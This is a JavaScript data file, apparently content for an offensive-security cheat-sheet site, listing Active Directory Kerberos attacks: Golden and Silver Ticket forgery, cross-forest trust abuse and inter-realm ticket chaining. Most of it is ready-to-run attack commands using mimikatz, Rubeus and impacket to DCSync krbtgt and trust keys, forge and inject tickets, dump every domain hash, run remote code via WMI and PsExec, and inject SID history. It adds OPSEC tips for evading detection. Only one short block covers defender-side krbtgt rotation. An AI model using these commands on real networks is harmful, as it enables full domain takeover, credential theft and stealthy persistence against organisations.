export const adTicketTechniques = [
  {
    id: 'ad-golden-ticket-deep',
    title: 'Golden Ticket — Complete Attack Methodology',
    subtitle: 'Forge TGTs signed with krbtgt NTLM/AES256 hash granting domain-wide persistent access — survives password resets',
    tags: ['Golden Ticket', 'krbtgt', 'TGT forge', 'mimikatz', 'Rubeus', 'impacket', 'domain persistence', 'PAC', 'SID'],
    accentColor: 'yellow',
    overview: 'A Golden Ticket is a forged Ticket Granting Ticket (TGT) signed with the domain\'s krbtgt secret key. Since the KDC trusts any TGT signed with its own key, a valid krbtgt hash grants the ability to forge TGTs for any user, with any group membership, with any ticket lifetime. Golden Tickets bypass every AD authentication control and survive account deletion, password resets, and even domain-level changes — only rotating the krbtgt password twice invalidates existing tickets. The ticket is generated entirely offline — no KDC contact is needed during forging, only during service ticket requests.',
    steps: [
      'Obtain the krbtgt NTLM hash and AES256 key via DCSync: requires DA/DCSync rights on the domain',
      'Obtain the domain SID: Get-DomainSID, or extract from any domain object\'s SID by removing the last RID',
      'Forge the Golden Ticket: include the target username (any string works), domain, SID, and krbtgt hash',
      'Inject the ticket with /ptt (Pass-the-Ticket) or write to a .kirbi file for later use',
      'Verify ticket with klist — should show your chosen username with DA group membership',
      'Access any domain resource: ls \\\\DC01\\C$, DCSync any account, execute code via WMI/PSExec',
      'OPSEC: use AES256 key instead of NTLM hash — RC4 etype 23 in logs is a high-fidelity detection indicator',
      'Golden Tickets survive for 10 years by default — rotate krbtgt TWICE within the window to invalidate all existing tickets',
    ],
    commands: [
      {
        title: 'Get krbtgt hash via DCSync (pre-requisite)',
        code: `# === Method 1: mimikatz DCSync (from DA session or with DCSync rights) ===
mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
# Note: NTLM (rc4_hmac) + AES256 (aes256_hmac)

# === Method 2: impacket-secretsdump (from Linux) ===
impacket-secretsdump corp.local/Administrator:'Password'@DC01 -just-dc-user krbtgt
# Or with ticket:
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc-user krbtgt

# === Method 3: netexec ===
nxc smb DC01 -u Administrator -p Password --ntds --user krbtgt

# Get domain SID
Get-DomainSID -Domain corp.local
# or: (Get-ADDomain).DomainSID.Value
# or from impacket:
impacket-getPac corp.local/user:Password -targetUser krbtgt -dc-ip DC01`
      },
      {
        title: 'Forge and inject Golden Ticket — mimikatz',
        code: `# === Golden Ticket with RC4/NTLM (noisy — etype 23) ===
mimikatz kerberos::golden /user:Administrator /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /krbtgt:NTLM-HASH-HERE \\
  /id:500 /groups:512,519,544,518 \\
  /ptt
# /id:500 = Administrator RID
# /groups:512=DA 519=EA 544=Admins 518=SchemaAdmins

# === Golden Ticket with AES256 (stealthy — etype 18) ===
mimikatz kerberos::golden /user:Administrator /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KRBTGT-KEY \\
  /id:500 /groups:512,519,544 \\
  /ptt

# === Save to kirbi file for later use ===
mimikatz kerberos::golden /user:Administrator /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KEY \\
  /ticket:golden.kirbi

# Inject later:
mimikatz kerberos::ptt golden.kirbi
# or: Rubeus ptt /ticket:golden.kirbi

# Verify injection:
klist
# Should show: corp.local  Administrator  kerberos TGT`
      },
      {
        title: 'Forge Golden Ticket — Rubeus (beacon-friendly)',
        code: `# === Rubeus Golden Ticket (AES256 — OPSEC safe) ===
execute-assembly /tools/Rubeus.exe golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KRBTGT-KEY \\
  /enctype:aes256 \\
  /id:500 \\
  /groups:512,519 \\
  /dc:DC01.corp.local \\
  /createnetonly:C:\\Windows\\System32\\cmd.exe \\
  /show /ptt /nowrap
# /createnetonly: creates a sacrificial process — tickets injected there, not current session
# /show: shows the spawned process PID to inject into

# Inject into specific LUID (session isolation)
execute-assembly /tools/Rubeus.exe golden \\
  /user:svcadmin \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /aes256:AES256-KRBTGT-KEY \\
  /luid:0x3e7 /ptt /nowrap`
      },
      {
        title: 'Forge Golden Ticket — impacket (from Linux)',
        code: `# ticketer.py — forge and output .ccache file
python3 /usr/share/doc/python3-impacket/examples/ticketer.py \\
  -nthash KRBTGT-NTLM \\
  -domain-sid S-1-5-21-DOMAIN-SID \\
  -domain corp.local \\
  -groups 512,519 \\
  -user-id 500 \\
  Administrator

# AES256 version (less detectable)
python3 ticketer.py \\
  -aesKey AES256-KRBTGT-KEY \\
  -domain-sid S-1-5-21-DOMAIN-SID \\
  -domain corp.local \\
  Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass DC01.corp.local
impacket-wmiexec -k -no-pass DC01.corp.local
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc

# Convert .ccache ↔ .kirbi if needed
python3 ticketConverter.py Administrator.ccache Administrator.kirbi`
      },
      {
        title: 'Post-Golden-Ticket operations',
        code: `# Access any domain resource
ls \\\\DC01.corp.local\\C$
ls \\\\DC01.corp.local\\ADMIN$
ls \\\\FILE01.corp.local\\C$

# DCSync the entire domain (dump all hashes)
mimikatz lsadump::dcsync /domain:corp.local /all /csv
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc

# Remote code execution via WMI
wmic /node:TARGET.corp.local process call create "cmd.exe /c whoami > C:\\output.txt"

# PSExec style
PsExec.exe \\\\TARGET.corp.local cmd.exe

# Check group membership in forged ticket
execute-assembly /tools/Rubeus.exe klist
# Verify: Groups: 512 (DA), 519 (EA)

# === Invalidating Golden Tickets (defender side) ===
# Must reset krbtgt password TWICE (10 hour gap between resets)
# First reset invalidates old tickets; second invalidates tickets made from the first new hash
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (Read-Host -Prompt "Enter password" -AsSecureString)
# Wait 10 hours (max ticket lifetime) then reset again`
      }
    ]
  },

  {
    id: 'ad-silver-ticket-deep',
    title: 'Silver Ticket — Service-Specific Ticket Forgery',
    subtitle: 'Forge TGS tickets for specific services using service account NTLM/AES hash — no DC contact, lower noise than Golden',
    tags: ['Silver Ticket', 'TGS forge', 'service account', 'SPN', 'PAC', 'mimikatz', 'Rubeus', 'CIFS', 'HOST', 'LDAP'],
    accentColor: 'yellow',
    overview: 'A Silver Ticket forges a Service Ticket (TGS) for a specific service, signed with that service account\'s NTLM hash (rather than krbtgt). Since service tickets are not validated by the KDC during use (the service validates them itself), Silver Tickets never touch the Domain Controller — they are entirely offline and generate no 4769 (TGS request) events on the DC. Silver Tickets give access to a single service on a specific host, not domain-wide access like Golden Tickets. However, they are stealthier and useful when you have a service account hash (e.g., from Kerberoasting).',
    steps: [
      'Obtain a service account NTLM hash: Kerberoasting, DCSync, LSASS dump, or Mimikatz',
      'Identify the SPN format: <service>/<host>.<domain> — e.g., cifs/fileserver.corp.local, http/web.corp.local',
      'Forge the Silver Ticket offline with the service account hash — no KDC contact needed',
      'Inject and access the specific service — verify with ls \\\\target\\C$ for CIFS or Invoke-WebRequest for HTTP',
      'Common service targets: CIFS (file access), HOST (PSExec equivalent), HTTP (web admin), WSMAN (WinRM), LDAP (DCSync if for DC$)',
      'CIFS Silver Ticket for DC$ NTLM hash → equivalent to Golden Ticket access on that DC',
      'LDAP Silver Ticket for DC$ hash → can perform DCSync operations via LDAP without krbtgt',
    ],
    commands: [
      {
        title: 'Common Silver Ticket service types and their access',
        code: `# SERVICE TYPES AND WHAT THEY UNLOCK:
# cifs/host.corp.local  → File share access (ls, copy, write)
# host/host.corp.local  → PSExec-like code execution
# http/host.corp.local  → HTTP endpoints, admin panels
# wsman/host.corp.local → WinRM / PowerShell remoting
# ldap/dc.corp.local    → LDAP queries (if for DC$ → DCSync)
# mssql/host.corp.local → SQL Server access
# rpcss/host.corp.local → WMI / DCOM execution

# Get service account hash (e.g., from Kerberoasting cracked hash, or DCSync)
mimikatz lsadump::dcsync /domain:corp.local /user:svc-iis
# Note rc4_hmac (NTLM) and aes256_hmac`
      },
      {
        title: 'Silver Ticket forge — mimikatz',
        code: `# === CIFS Silver Ticket (file access) ===
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /target:fileserver.corp.local \\
  /service:cifs \\
  /rc4:SERVICE-ACCOUNT-NTLM \\
  /ptt
# Verify: ls \\\\fileserver.corp.local\\C$

# === HOST Silver Ticket (remote execution) ===
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /target:server.corp.local \\
  /service:host \\
  /aes256:SERVICE-AES256-KEY \\
  /ptt
# Use: sc.exe \\\\server.corp.local query type= all

# === LDAP Silver Ticket for DC$ → DCSync ===
# Get DC machine account hash
mimikatz lsadump::dcsync /domain:corp.local /user:DC01$
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /target:DC01.corp.local \\
  /service:ldap \\
  /rc4:DC01-MACHINE-NTLM \\
  /ptt
# DCSync via LDAP service ticket (no krbtgt needed)
mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt /dc:DC01.corp.local

# === WSMAN Silver Ticket (WinRM) ===
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /target:server.corp.local \\
  /service:wsman \\
  /rc4:SERVICE-NTLM /ptt
# Use: Enter-PSSession -ComputerName server.corp.local`
      },
      {
        title: 'Silver Ticket — Rubeus and impacket',
        code: `# Rubeus — Silver Ticket
execute-assembly /tools/Rubeus.exe silver \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-DOMAIN-SID \\
  /target:fileserver.corp.local \\
  /service:cifs \\
  /aes256:SERVICE-AES256 \\
  /ptt /nowrap

# impacket ticketer.py — Silver Ticket
python3 ticketer.py \\
  -nthash SERVICE-NTLM \\
  -domain-sid S-1-5-21-DOMAIN-SID \\
  -domain corp.local \\
  -spn cifs/fileserver.corp.local \\
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass //fileserver.corp.local/C$

# Silver Ticket with PAC disabled (skip PAC validation)
python3 ticketer.py \\
  -nthash SERVICE-NTLM \\
  -domain-sid S-1-5-21-DOMAIN-SID \\
  -domain corp.local \\
  -spn http/web.corp.local \\
  -extra-pac \\
  Administrator`
      }
    ]
  },

  {
    id: 'ad-cross-forest-attacks',
    title: 'Cross-Forest Trust Exploitation — Complete Attack Chain',
    subtitle: 'Enumerate and escalate across forest trust boundaries using SID history, trust keys, and conditional access gaps',
    tags: ['cross-forest', 'forest trust', 'SID filtering', 'SID history', 'trust key', 'Extra SIDs', 'PAM trust', 'selective authentication'],
    accentColor: 'yellow',
    overview: 'Forest trusts extend AD authentication across completely separate forest boundaries — far harder to abuse than parent/child trusts because SID filtering is enabled by default between forests (blocking SID history injection). However, specific misconfigurations create escalation paths: disabled SID filtering (catastrophic), PAM trusts (shadow principals), selective authentication bypasses, and trust key theft for inter-realm ticket forging. Forest A compromising Forest B via a trust requires either a misconfiguration or the trust key.',
    steps: [
      'Enumerate all forest trusts and their properties: direction, transitive, SIDFiltering, selective authentication',
      'SID filtering check: if disabled between forests, SID history injection works cross-forest (rare but catastrophic)',
      'Selective authentication: if enabled, only specific accounts can authenticate across the trust — enumerate allowed principals',
      'Trust key extraction: the inter-realm TGT signing key (shared secret) is stored as [FOREIGN_DOMAIN]$ in the domain — steal it for ticket forging',
      'PAM trust enumeration: Privileged Access Management trusts create "shadow" accounts in a bastion forest — enumerate these for privilege discovery',
      'ForeignSecurityPrincipal: users from trusted forest in local groups — look for direct group membership paths',
      'Cross-forest kerberoasting: request TGS tickets for SPNs in the trusted forest using the inter-realm ticket',
    ],
    commands: [
      {
        title: 'Forest trust enumeration',
        code: `# Enumerate all trusts (domain + forest level)
Get-DomainTrust | Select-Object SourceName, TargetName, TrustDirection, TrustType, TrustAttributes, SIDFiltering
Get-ForestTrust | Select-Object TopLevelNames, SourceName, TargetName

# PowerView deeper
Get-DomainTrust -Net | Select-Object *
# SIDFiltering=False on ForestTransitive trust → SID history injection works cross-forest

# impacket from Linux
impacket-findDelegation corp.local/user:Password -dc-ip DC01
# Look for forest trusts with SID filtering status

# bloodhound-python cross-forest collection
bloodhound-python -u user -p Password -d corp.local -dc DC01 -c Trusts --zip

# Enumerate ForeignSecurityPrincipals (users from trusted forest in local groups)
Get-DomainForeignGroupMember -Domain corp.local
# Example: FOREST-B\\DA_Account is in corp.local\\Server_Admins

# BloodHound Cypher — find cross-trust paths
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)-[:AdminTo|HasSession|Contains]->(c:Computer)
WHERE u.domain <> g.domain RETURN p LIMIT 50`
      },
      {
        title: 'Trust key extraction and inter-realm ticket forging',
        code: `# Get trust key (inter-realm key) via DCSync
# The trust relationship creates a special account: FORESTB$ (or FOREIGNDOMAIN$)
mimikatz lsadump::dcsync /domain:corp.local /user:FORESTB$
# This gives the shared secret between the forests (same key used by KDC)

# Alternative: extract from DC LSASS (as SYSTEM on DC)
mimikatz lsadump::trust /patch
# Shows all trust keys including forest trust keys

# Forge inter-realm Golden Ticket using trust key
# This ticket crosses the trust boundary into the target forest
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-CORP-SID \\
  /rc4:TRUST-KEY-NTLM \\
  /service:krbtgt \\
  /target:targetforest.com \\
  /ptt
# This gives a ticket that the targetforest.com KDC will accept

# Then request services in the target forest
execute-assembly /tools/Rubeus.exe asktgs \\
  /ticket:<INTER-REALM-TGT-BASE64> \\
  /service:cifs/dc01.targetforest.com \\
  /dc:dc01.targetforest.com \\
  /ptt /nowrap

# Cross-forest Kerberoasting (roast SPNs in target forest)
execute-assembly /tools/Rubeus.exe kerberoast \\
  /domain:targetforest.com \\
  /dc:dc01.targetforest.com \\
  /nowrap`
      },
      {
        title: 'SID filtering disabled — full forest escalation',
        code: `# If SIDFiltering is False between forests: inject Extra SIDs from target forest
# This is the "nuclear" misconfiguration — any domain compromise in Forest A = Forest B DA

# Step 1: Get Forest B Domain SID
Get-DomainSID -Domain targetforest.com
# or: Get-ADDomain -Server targetforest.com | Select-Object DomainSID

# Step 2: Forge Golden Ticket with Forest B EA SID in SIDHistory
mimikatz kerberos::golden \\
  /user:Administrator \\
  /domain:corp.local \\
  /sid:S-1-5-21-CORP-SID \\
  /krbtgt:CORP-KRBTGT-NTLM \\
  /sids:S-1-5-21-FORESTB-SID-519 \\
  /ptt
# S-1-5-21-FORESTB-SID-519 = Enterprise Admins of target forest

# Verify: access target forest DC
ls \\\\dc01.targetforest.com\\C$
mimikatz lsadump::dcsync /domain:targetforest.com /user:krbtgt \\
  /dc:dc01.targetforest.com

# impacket cross-forest
python3 ticketer.py \\
  -nthash CORP-KRBTGT-NTLM \\
  -domain-sid S-1-5-21-CORP-SID \\
  -domain corp.local \\
  -extra-sid S-1-5-21-FORESTB-SID-519 \\
  Administrator
export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass dc01.targetforest.com -just-dc`
      },
      {
        title: 'PAM trust and shadow principal abuse',
        code: `# PAM (Privileged Access Management) trust: bastion forest → production forest
# Creates shadow principals (copies of privileged accounts) in bastion forest
# Shadow account in bastion forest has access to accounts in production forest

# Enumerate PAM trust
Get-DomainTrust | Where-Object { $_.TrustAttributes -band 0x00000200 }
# TrustAttributes bit 0x200 = PAM_ENABLED

# In target forest: find foreign security principals from bastion forest
Get-DomainForeignGroupMember -Domain corp.local |
  Where-Object { $_.MemberDomain -eq "bastion.local" }
# If bastion\\shadow_da is in corp.local\\Domain Admins → compromise bastion = corp DA

# Enumerate ShadowPrincipal objects (from bastion forest)
Get-ADObject -Filter {objectClass -eq "msDS-ShadowPrincipal"} \\
  -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=bastion,DC=local" \\
  -Properties msDS-ShadowPrincipalSid

# Cross-forest selective authentication bypass
# If selective authentication is ON: check for specific accounts with
# "Allowed to Authenticate" rights on forest computers
Get-DomainObjectAcl -Identity "DC=corp,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match "Allowed-To-Authenticate"}`
      }
    ]
  },

  {
    id: 'ad-trust-ticket-chain',
    title: 'Inter-Realm Ticket Chaining — Multi-Domain Escalation',
    subtitle: 'Chain Kerberos delegation across multiple domain and forest boundaries using trust tickets and referral TGTs',
    tags: ['inter-realm TGT', 'trust chaining', 'referral ticket', 'cross-domain delegation', 'KDC referral', 'ticket chain'],
    accentColor: 'purple',
    overview: 'When a user in Domain A requests access to a resource in Domain B, the KDC issues an inter-realm TGT (referral ticket) signed with the shared trust key. This ticket, when presented to Domain B\'s KDC, results in a local TGT for that domain. By stealing trust keys at each hop, an attacker can forge tickets through an entire chain of domain trusts — from a low-level child domain all the way to the forest root, then across to a trusted external forest. Each trust link in the chain only requires the trust key for that specific link.',
    steps: [
      'Map the full trust chain: child.sub.corp.local → sub.corp.local → corp.local → trusted-forest.com',
      'Compromise each domain step-by-step, extracting trust keys at each hop',
      'Forge inter-realm TGTs to traverse each trust hop without legitimate credentials',
      'Ultimate goal: forest root enterprise admin access, then cross-forest if applicable',
      'Identify transitive trust paths: transitive trusts allow A→C through B without A-C direct trust',
      'Extract trust account passwords from domain: LDAP query for accounts ending in $$ with description containing "trust key"',
    ],
    commands: [
      {
        title: 'Trust chain enumeration and traversal',
        code: `# Map full trust chain from current domain
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domain.GetAllTrustRelationships() | Select-Object SourceName, TargetName, TrustDirection, TrustType

# PowerView complete trust enumeration
Get-DomainTrust -Recurse | Select-Object SourceName, TargetName, TrustDirection, TrustAttributes

# impacket trust chain from Linux
impacket-findDelegation corp.local/user:Password -dc-ip 10.10.10.1
# Then for each trusted domain:
impacket-findDelegation sub.corp.local/user:Password -dc-ip 10.10.20.1

# Extract trust keys at each hop
# Get trust account hashes (domain accounts with $ suffix representing trust links)
Get-DomainUser -Filter "(samAccountName=*$)" | 
  Where-Object {$_.useraccountcontrol -band 8192} |   # INTERDOMAIN_TRUST_ACCOUNT flag
  Select-Object samaccountname

# DCSync for each trust account
mimikatz lsadump::dcsync /domain:child.corp.local /user:CORP$
# CORP$ account holds the child→parent trust key

# Chain traversal:
# 1. Forge inter-realm TGT child→parent using CORP$ hash
# 2. Present to parent KDC → get parent TGT
# 3. Forge inter-realm TGT parent→forest using FORESTB$ hash
# 4. Present to forest KDC → enterprise admin access`
      }
    ]
  },
];